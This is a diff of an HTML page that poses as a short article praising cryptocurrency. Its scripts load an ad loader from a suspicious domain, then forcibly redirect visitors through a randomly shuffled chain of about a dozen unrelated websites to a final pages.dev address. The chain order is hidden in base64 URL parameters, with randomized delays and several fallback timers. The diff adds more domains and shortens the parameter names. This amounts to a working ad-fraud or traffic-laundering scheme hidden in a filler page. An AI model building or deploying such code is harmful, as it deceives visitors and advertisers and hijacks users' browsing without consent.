@@ -3,54 +3,74 @@
 <head>
 <meta charset="UTF-8">
 <title>Crypto is the Future 💰</title>
+
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-1R5CE8315F"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-1R5CE8315F');
+  gtag("js", new Date());
+  gtag("config", "G-1R5CE8315F");
 </script>
+
 <style>
   body {
-    background:#0a0a0a;
-    color:#fff;
-    font-family:Arial, sans-serif;
-    text-align:center;
-    padding:50px 20px;
+    margin: 0;
+    padding: 40px 20px;
+    background: radial-gradient(circle at top, #0a0a0a, #000000);
+    color: #e6e6e6;
+    font-family: "Segoe UI", Arial, sans-serif;
+    text-align: center;
   }
+
   .box {
-    background:#111;
-    border:1px solid #333;
-    padding:20px;
-    border-radius:12px;
-    max-width:500px;
-    margin:0 auto 20px auto;
-    box-shadow:0 0 10px rgba(255,255,255,0.07);
+    background: rgba(20, 20, 20, 0.7);
+    backdrop-filter: blur(6px);
+    border: 1px solid #1c1c1c;
+    padding: 25px;
+    border-radius: 14px;
+    max-width: 540px;
+    margin: 0 auto;
+    box-shadow: 0 0 20px rgba(0, 255, 154, 0.15);
+    animation: fadeIn 1.8s ease;
   }
+
   h2 {
-    color:#00ff9a;
-    font-size:22px;
-    margin-bottom:10px;
+    color: #00ff9a;
+    font-size: 26px;
+    text-shadow: 0 0 10px #00ff9a;
+    margin-bottom: 12px;
   }
+
   p {
-    font-size:14px;
-    line-height:1.5;
-    opacity:0.9;
+    font-size: 15px;
+    line-height: 1.55;
+    opacity: 0.92;
   }
+
   .loader {
-    margin-top:20px;
-    font-size:13px;
-    opacity:0.7;
+    margin-top: 25px;
+    font-size: 14px;
+    opacity: 0.75;
+    animation: fadeBlink 2s infinite;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes fadeBlink {
+    0% { opacity: 0.3; }
+    50% { opacity: 1; }
+    100% { opacity: 0.3; }
   }
 </style>
 
-<!-- ================= REDIRECTION CONTROL ================= -->
+<!-- REDIRECTION CONTROL -->
 <script>
-  const REDIRECTION_ENABLED =true;  // change to false to disable redirect
+  const REDIRECTION_ENABLED = true;
 </script>
-<!-- ======================================================= -->
 
 <!-- AD SCRIPT -->
 <script id="AdsCoreLoader"
@@ -58,46 +78,54 @@ src="https://sads.adsboosters.xyz/ffc8b614d688665892a7071a2a3dc5f2.js"
 data-cfasync="false"></script>
 
 <script>
-// ALL DOMAINS
+// ALL DOMAINS (short format + new domains added)
 let domains = [
     "https://glimmerbyte.com/",
     "https://healthyhumansource.com/",
     "https://eduprothink.com/",
-    "https://linkcents.com/"
+    "https://linkcents.com/",
+    "https://bihartown.com/",
+    "https://carbikeswale.com/",
+    "https://evcarjankari.com/",
+    "https://ghiblistudioart.in/",
+    "https://hypicc.com/",
+    "https://hypicprompt.in/",
+    "https://motahone.in/",
+    "https://subhadralist.org.in/",
+    "https://theindianbytes.in/"
 ];
 
 // REMOVE CURRENT DOMAIN
 let current = window.location.origin + "/";
 domains = domains.filter(d => d !== current);
 
-// Shuffle
-function shuffle(array) {
-    for (let i = array.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [array[i], array[j]] = [array[j], array[i]];
+// Shuffle array
+function shuffle(arr) {
+    for (let i = arr.length - 1; i > 0; i--) {
+        let j = Math.floor(Math.random() * (i + 1));
+        [arr[i], arr[j]] = [arr[j], arr[i]];
     }
-    return array;
+    return arr;
 }
 
-// Params
+// Short parameter names
 let params = new URLSearchParams(window.location.search);
-let orderParam = params.get("order");
-let index = parseInt(params.get("index")) || 0;
+let orderParam = params.get("o"); // short param
+let index = parseInt(params.get("i")) || 0; // short param
 
 let order = orderParam ? atob(orderParam).split(",") : shuffle([...domains]);
 
-// Final page
+// Final target URL
 const finalUrl = "https://testss-3c9.pages.dev/";
 
-// Delay
+// Random delay
 function delay() {
     return 5000 + Math.floor(Math.random() * 2000);
 }
 
-// Redirect function
+// Redirect
 function doRedirect() {
-    if (!REDIRECTION_ENABLED) return;  // stop if disabled
-
+    if (!REDIRECTION_ENABLED) return;
     if (window.redirected) return;
     window.redirected = true;
 
@@ -105,28 +133,27 @@ function doRedirect() {
         if (index < order.length - 1) {
             index++;
             let encoded = btoa(order.join(","));
-            window.location.href = order[index] + "?order=" + encoded + "&index=" + index;
+            window.location.href = order[index] + "?o=" + encoded + "&i=" + index;
         } else {
             window.location.href = finalUrl;
         }
     }, delay());
 }
 
-// AD SCRIPT EVENTS
+// AD script events
 const adScript = document.getElementById("AdsCoreLoader");
 if (adScript) {
     adScript.onload = () => doRedirect();
     adScript.onerror = () => doRedirect();
 }
 
-// FallBack
+// Fallbacks
 setTimeout(() => { if (!window.redirected) doRedirect(); }, 4000);
 
 document.addEventListener("DOMContentLoaded", () => {
     setTimeout(() => { if (!window.redirected) doRedirect(); }, 3000);
 });
 </script>
-
 </head>
 
 <body>
@@ -134,17 +161,16 @@ document.addEventListener("DOMContentLoaded", () => {
 <div class="box">
   <h2>Crypto is the Future 💰</h2>
   <p>
-    Cryptocurrency is becoming one of the fastest growing digital assets in the world.
-    Bitcoin, Ethereum and stablecoins are now widely used for online payments, trading,
-    and digital investments.
+    Cryptocurrency continues to grow as one of the most powerful digital assets worldwide.
+    Bitcoin, Ethereum and stablecoins are used for payments, trading and decentralized finance.
   </p>
   <p>
-    Millions of people trust blockchain because it is fast, secure and decentralized.
-    Always learn before you invest and use trusted platforms only.
+    Blockchain offers transparency, security and global access.
+    Always learn, research and invest wisely using trusted platforms.
   </p>
 </div>
 
-<div class="loader">Please wait… Loading content and redirecting</div>
+<div class="loader">Please wait… redirecting</div>
 
 </body>
 </html>
